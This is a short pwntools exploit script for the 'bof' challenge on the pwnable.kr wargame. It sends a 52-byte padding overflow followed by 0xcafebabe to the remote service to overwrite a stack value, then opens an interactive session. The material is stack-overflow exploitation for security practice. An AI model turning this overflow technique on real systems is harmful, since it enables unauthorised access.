from pwn import *

context.arch = 'amd64'

offset = 13 * 4

elf = ELF('./bof')
#p = elf.process()
p = remote('pwnable.kr', 9000)

payload = b'A' * offset + b'\xbe\xba\xfe\xca'

p.sendline(payload)
p.interactive()
